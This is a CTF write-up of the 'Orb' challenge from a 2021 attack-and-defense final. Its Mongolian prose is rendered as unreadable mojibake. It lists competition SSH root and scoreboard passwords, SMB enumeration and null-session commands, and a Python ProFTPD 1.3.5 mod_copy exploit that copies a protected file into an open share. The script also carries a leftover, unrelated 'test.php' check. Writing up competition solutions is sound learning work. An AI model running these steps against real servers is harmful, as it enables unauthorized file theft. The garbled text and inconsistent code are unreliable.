---
published: true
---
# HZ 2021 Final Round Orb
<p align="center">
–ó–æ—á–∏–ª—Å–æ–Ω —Ö“Ø–Ω–∏–π —Ç–æ–æ üëâ 
</p>
![Visitor Count](https://profile-counter.glitch.me/{fg0d}/count.svg)

<p align="center">
  <img src="https://raw.githubusercontent.com/fg0d/fg0d.github.io/master/photos/hzz.png">
</p>

"–•–∞—Ä—É—É–ª –ó–∞–Ω–≥–∏ 2021" –∞–º–∂–∏–ª—Ç—Ç–∞–π –±–æ–ª–∂ ”©–Ω–¥”©—Ä–ª”©–ª”©”©. –ú–∏–Ω–∏–π –±–∏–µ —ç–Ω—ç –∂–∏–ª **AnonSec** –±–∞–≥–∞–∞—Å —Ö–æ—ë—Ä –Ω–∞–π–∑—Ç–∞–π–≥–∞–∞ —Ö–∞–º—Ç –æ—Ä–æ–ª—Ü—Å–æ–Ω –±”©–≥”©”©–¥ 1-—Ä —à–∞—Ç–∞–Ω–¥ 3-—Ä –±–∞–π—Ä–∞–Ω–¥ , 2-—Ä —à–∞—Ç–∞–Ω–¥ 5-—Ä –±–∞–π—Ä–∞–Ω–¥ –æ—Ä—Å–æ–Ω –±–∏–ª—ç—ç. –≠–Ω—ç –∂–∏–ª ”©–º–Ω”© –∂–∏–ª–∏–π–Ω —Ç—ç–º—Ü—ç—ç–Ω–∏–π–≥ —Å–æ–Ω–∏—Ä—Ö–æ–ª—Ç–æ–π –±–æ–ª–≥–æ–∂ ”©–≥—Å”©–Ω –∑“Ø–π–ª –Ω—å –§–∏–Ω–∞–ª—ã–Ω —à–∞—Ç "Attack And Defense" —Ç”©—Ä–ª”©”©—Ä —è–≤–∞–≥–¥—Å–∞–Ω. –ú–∞–Ω–∞–π –±–∞–≥ —Ç”©–¥–∏–π–ª”©–Ω ”©–Ω–¥”©—Ä –∞–º–∂–∏–ª—Ç “Ø–∑“Ø“Ø–ª–∂ —á–∞–¥–∞–∞–≥“Ø–π —á –≥—ç—Å—ç–Ω ”©”©—Ä—Å–¥–∏–π–Ω –±–æ–¥—Å–æ–Ω –±–æ–¥–ª–æ–≥–æ–æ —Ç–∞–π–ª–±–∞—Ä—Ç–∞–π–≥–∞–∞—Ä —Ö“Ø—Ä–≥—ç—Ö –Ω—å –∑“Ø–π—Ç—ç–π –±–æ–ª–æ–≤ —É—É –≥—ç–∂ –±–æ–¥–ª–æ–æ.

## Orb

–§–∏–Ω–∞–ª—ã–Ω —à–∞—Ç–∞–Ω–¥ –±–∞–≥ –±“Ø—Ä—Ç —Ç—É—Å–¥–∞–∞ **Docker** “Ø“Ø—Å–≥—ç–∂ ”©–≥—Å”©–Ω —É—á—Ä–∞–∞—Å —ç—Ö–ª—ç—ç–¥ SSH-—ç—ç—Ä —Ö–∞–Ω–¥–∞–∂ –æ—Ä–æ—Ö —Ö—ç—Ä—ç–≥—Ç—ç–π –±–æ–ª—Å–æ–Ω

–ñ–∏—à—ç—ç –Ω—å: **–ú–∞–Ω–∞–π –±–∞–≥–∏–π–Ω SSH login —Ö—ç—Å—ç–≥**

–ë–∞–≥–∏–π–Ω –Ω—ç—Ä: **AnonSec**
<br>
–ú–∞–Ω–∞–π –±–∞–≥–∏–π–Ω domain: **hz-vulbox3.haruulzangi.mn**
<br>
SSH username: **root**
<br>
SSH password: **u3RYQMZDaAg4bEEq6SmLOi**
<br>
[–û–Ω–æ–æ–Ω—ã —Å–∞–º–±–∞—Ä —Ö–∞—Ä–∞—Ö , —Ñ–ª–∞–≥–∞–∞ –æ—Ä—É—É–ª–∞—Ö —Ö—ç—Å—ç–≥:](http://final.haruulzangi.mn:19999/)
<br>
"–ù—ç–≤—Ç—Ä—ç—Ö –Ω—ç—Ä": **AnonSec**
<br>
"–ù—É—É—Ü “Ø–≥": **5Ft1ELGZOqUI87W4**

“Æ“Ø–Ω–∏–π –¥–∞—Ä–∞–∞ –±–∏–¥ challenge –±“Ø—Ä–∏–π–Ω docker-–Ω –º—ç–¥—ç—ç–ª–ª–∏–π–≥ —Ö–∞—Ä–∞—Ö—ã–Ω —Ç—É–ª–¥ —ç–Ω—ç—Ö“Ø“Ø —Ç—É—à–∞–∞–ª—ã–≥ –∞—à–∏–≥–ª–∞—Ö –±–æ–ª–æ–º–∂—Ç–æ–π

root@ip-10-10-20-23:~# **docker ps -a**

`e57944a41e96   orb             "/tmp/entrypoint.sh ‚Ä¶"   9 hours ago    Up 6 hours   0.0.0.0:21->21/tcp, :::21->21/tcp, 0.0.0.0:139->139/tcp, :::139->139/tcp, 0.0.0.0:445->445/tcp, :::445->445/tcp, 0.0.0.0:2205->22/tcp, :::2205->22/tcp   orb`

–¢—É—à–∞–∞–ª—ã–≥ –±–∏—á—Å—ç–Ω—ç—ç—Ä –±–∏–¥ –Ω–∞—Ä **Orb** –¥–∞–∞–ª–≥–∞–≤–∞—Ä–ª—É—É **bash shell** -—ç—ç—Ä –æ—Ä–∂ –±–∞–π–≥–∞–∞ —é–º.

root@ip-10-10-20-23:~# **docker exec -it orb /bin/bash**

–û—Ä—Å–Ω—ã –¥–∞—Ä–∞–∞ —Ñ–∞–π–ª—É—É–¥—ã–≥ –Ω—ç–≥ –±“Ø—Ä—á–ª—ç–Ω —Ç—É—Ä—à–∏–∂ “Ø–∑—ç—Ö—ç–¥ **ProFTPd** , **Samba** –≥—ç—Å—ç–Ω —Ö–æ—ë—Ä —Ç–∞–Ω–∏–ª —Å–µ—Ä–≤–∏—Å –±–∞–π—Ö—ã–≥ —Ö–∞—Ä–∂ –±–æ–ª–Ω–æ. 

`Samba –±—É—é—É SMB –Ω—å 445 , 139-—Ä –ø–æ—Ä—Ç–æ–Ω –¥—ç—ç—Ä –∞–∂–∏–ª–ª–∞–¥–∞–≥ —Ñ–∞–π–ª —Ö—É–≤–∞–∞–ª—Ü–∞—Ö –±–æ–ª–æ–º–∂—ã–≥ –±“Ø—Ä–¥“Ø“Ø–ª–¥—ç–≥ –ø—Ä–æ—Ç–æ–∫–æ–ª`

`ProFTPd –±—É—é—É FTP –Ω—å 21-—Ä –ø–æ—Ä—Ç–æ–Ω –¥—ç—ç—Ä –∞–∂–∏–ª–ª–∞–¥–∞–≥ —Ñ–∞–π–ª –¥–∞–º–∂—É—É–ª–∞—Ö –±–æ–ª–æ–º–∂—ã–≥ –±“Ø—Ä–¥“Ø“Ø–ª–¥—ç–≥ –ø—Ä–æ—Ç–æ–∫–æ–ª`

> SMB –¥—ç—ç—Ä Null session “Ø“Ø—Å–≥—ç–∂ –Ω—É—É—Ü “Ø–≥ —à–∞–∞—Ä–¥–ª–∞–≥“Ø–π–≥—ç—ç—Ä —Ö–∞–Ω–¥–∞–ª—Ç —Ö–∏–π—Ö –±–æ–ª–æ–º–∂—Ç–æ–π —ç–º–∑—ç–≥ –±–∞–π–¥–∞–ª –±–∞–π–¥–∞–≥

> ProFTPd –¥—ç—ç—Ä —Ö–∞–º–≥–∏–π–Ω —Å–∞–π–Ω –º—ç–¥—ç—Ö mod_copy —ç–º–∑—ç–≥ –±–∞–π–¥–∞–ª –±–∞–π–¥–∞–≥

–û–¥–æ–æ —Ç—ç–≥–≤—ç–ª —ç–Ω—ç—Ö“Ø“Ø —Ö–æ—ë—Ä —Å–µ—Ä–≤–∏—Å—ã–Ω —É—è–ª–¥–∞–∞ —Ö–æ–ª–±–æ–æ–≥ –∂–∞–∞—Ö–∞–Ω –æ–π–ª–≥–æ—Ö —Ö—ç—Ä—ç–≥ –≥–∞—Ä–Ω–∞. –≠—Ö–ª—ç—ç–¥ —é—É–≥ –∞—à–∏–≥–ª–∞–∂ –±–æ–ª–æ—Ö –≤—ç –≥—ç—Ö—ç—ç—Ä:

SMB-–≥ **Enumeration** —Ö–∏–π–∂ –º—ç–¥—ç—ç–ª—ç–ª —Ü—É–≥–ª—É—É–ª–∞—Ö —Ö—ç—Ä—ç–≥—Ç—ç–π.

`$IP = '18.162.113.173'`

`enum4linux -A $IP`

–∏–Ω–≥—ç—Å–Ω—ç—ç—Ä —è–º–∞—Ä —Ö—ç—Ä—ç–≥–ª—ç–≥—á–∏–¥ –±–∞–π–≥–∞–∞ –º—ç–¥—ç—ç–ª–ª–∏–π–≥ , –º”©–Ω default-–∞–∞—Ä –±–∞–π–≥–∞–∞ –±–æ–ª —à—É—É–¥ –Ω—É—É—Ü “Ø–≥–∏–π–≥ –æ–ª–æ—Ö –±–æ–ª–æ–º–∂—Ç–æ–π –±–∞–π–¥–∞–≥

`yondu`

`gamora`

`nebula`

–≥—ç—Å—ç–Ω 3 —Ö—ç—Ä—ç–≥–ª—ç–≥—á –æ–ª–¥–ª–æ–æ

–¢—ç–≥–≤—ç–ª —ç–Ω—ç—Ö“Ø“Ø 3 —Ö—ç—Ä—ç–≥–ª—ç–≥—á—Ä“Ø“Ø –æ—Ä–æ—Ö–æ–¥ –±–∏–¥–Ω–∏–π Permission —Ö“Ø—Ä—ç—Ö “Ø“Ø? **Access** —Ö–∏–π–∂ —á–∞–¥–∞—Ö —É—É –≥—ç–¥–≥–∏–π–≥ —à–∞–ª–≥–∞—Ö—ã–Ω —Ç—É–ª–¥:

`$IP = '18.162.113.173'`

`smbmap -H 18.162.113.173`

|print$          |Disk      |Printer Drivers|
|----------------|----------|---------------|
|yondu           |Disk      |/samba/ is a nice planet to place orb ( Admin access )|
|gamora          |Disk      |Where is the orb? ( Admin access )|
|nebula          |Disk      |Why is gamora? ( Free access )|
|IPC$            |IPC       |IPC Service (e57944a41e96 server (Samba, Ubuntu))|
    
“Ø“Ø–Ω—ç—ç—Å —Ö–∞—Ä–≤–∞–ª **nebula** —Ö—ç—Ä—ç–≥–ª—ç–≥—á—Ä“Ø“Ø –Ω—ç–≤—Ç—Ä—ç—Ö—ç–¥ **Free access**-—Ç–∞–π –±—É—é—É **Null session** “Ø“Ø—Å–≥—ç—Ö –±–æ–ª–æ–º–∂—Ç–æ–π –±–∞–π–≥–∞–∞–≥ —Ö–∞—Ä–∂ –±–æ–ª–Ω–æ.

`smbclient //18.162.113.173/nebula`

–Ω—É—É—Ü “Ø–≥ —à–∞–∞—Ä–¥–ª–∞–≥–∞–≥“Ø–π —à—É—É–¥ **Enter** –¥–∞—Ä–∞–∞–¥ –æ—Ä–Ω–æ

–≠–Ω—ç –º–∞–∞–Ω—å –±–∏–¥–Ω–∏–π —Ñ–∞–π–ª–∞–∞ —Ö—É—É–ª–∞–∞–¥ —Ç–∞–≤–∏—Ö–∞–¥ —Ö–∞—Ä–∞—Ö –±–æ–ª–æ–º–∂—Ç–æ–π —Ö—ç—Ä—ç–≥–ª—ç–≥—á –≥—ç–∂ –æ–π–ª–≥–æ–∂ –±–æ–ª–Ω–æ.

–ó–∞ –æ–¥–æ–æ ProFTPd-–≥—ç—ç—Ä “Ø–Ω–¥—Å—ç–Ω **flag** —Ñ–∞–π–ª–∞–∞ mod_copy —Ö–∏–π–∂ **nebula** —Ö—ç—Ä—ç–≥–ª—ç–≥—á—Ä“Ø“Ø —Ö—É—É–ª–∞—Ö —à–∞–∞—Ä–¥–ª–∞–≥–∞ “Ø“Ø—Å—ç–∂ –±–∞–π–≥–∞–∞

IP-–≥–∞–∞—Ä –Ω—å —Å–∫–∞–Ω —Ö–∏–π–∂ “Ø–∑–≤—ç–ª:

`21/tcp   open   ftp         ProFTPD 1.3.5`

ProFTPd 1.3.5 —Ö—É–≤–∏–ª–±–∞—Ä –±–∞–π—Å–∞–Ω –±”©–≥”©”©–¥ Exploit-–Ω —Ö–∞–π–∂ “Ø–∑–≤—ç–ª

[Exploit —Ö–∏–π—Ö –ª–∏–Ω–∫](https://www.exploit-db.com/exploits/36742)  —ç–Ω—ç—Ö“Ø“Ø –ª–∏–Ω–∫—ç—ç—Ä –æ—Ä–æ–æ–¥ “Ø–∑—ç–∂ –±–æ–ª–Ω–æ

–®—É—É–¥ —ç–Ω—ç—Ö“Ø“Ø exploit-–≥ –∞–∂–∏–ª–ª—É—É–ª–∞—Ö –±–æ–ª–æ–º–∂–≥“Ø–π –±”©–≥”©”©–¥ “Ø“Ø–Ω–∏–π–≥ —Å–∫—Ä–∏–ø—Ç –±–æ–ª–≥–æ–æ–¥ –±–∞–≥–∞ –∑—ç—Ä—ç–≥ ”©”©—Ä—á–ª”©–ª—Ç –æ—Ä—É—É–ª–≤–∞–ª

```python
import sys
import socket
import requests

def exploit(client, target):
    client.connect((target,21)) # Connecting to the target server
    banner = client.recv(74)
    print(banner.decode())
    client.send(b'site cpfr /flag\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto /samba/nebula/flag.txt\r\n')
    print(client.recv(1024).decode())
    client.close()
    print('Exploit Completed')

def check(url):
    req = requests.get(url) # Requesting the written PoC php file via HTTP
    if req.status_code == 200:
        print('[+] File Written Successfully')
        print(f'[+] Go to : {url}')
    else:
        print('[!] Something Went Wrong')
        print('[!] Directory might not be writable')

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target = sys.argv[1]
    exploit(client, target)
    url = 'http://' + target + '/test.php'
    check(url)

if __name__ == '__main__':
    main()
```

**Exploit completed** –±–æ–ª—Å–æ–Ω—ã –¥–∞—Ä–∞–∞ **smbclient**-–∞–∞—Ä –æ—Ä—Å–æ–Ω **nebula** —Ö—ç—Ä—ç–≥–ª—ç–≥—á—ç—ç—Ä –æ—Ä–æ–æ–¥ **dir** —Ç—É—à–∞–∞–ª—ã–≥ –±–∏–µ–ª“Ø“Ø–ª—ç—Ö—ç–¥ **flag** —Ö—É—É–ª–∞–≥–¥—Å–∞–Ω –±–∞–π—Ö –±–æ–ª–Ω–æ

<p align="center">
  <img src="https://raw.githubusercontent.com/fg0d/fg0d.github.io/master/photos/flag.PNG">
</p>
